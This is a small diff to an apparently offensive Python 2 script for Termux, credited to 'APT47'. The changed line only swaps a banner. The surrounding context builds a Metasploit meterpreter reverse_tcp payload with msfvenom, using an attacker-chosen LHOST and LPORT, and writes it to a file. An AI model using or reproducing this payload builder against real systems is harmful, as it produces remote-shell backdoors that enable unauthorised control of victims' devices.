@@ -33,7 +33,7 @@ port = raw_input ("PORT : ")
 out = raw_input ("OUTPUT : ")
 os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
 os.system ("clear")
-os.system ("figlet EXPLOIT | lolcat")
+os.system ("cat /data/data/com.termux/files/home/METASEC/exploit.txt | lolcat")
 print
 print " PROGRAM BY APT47 "
 print
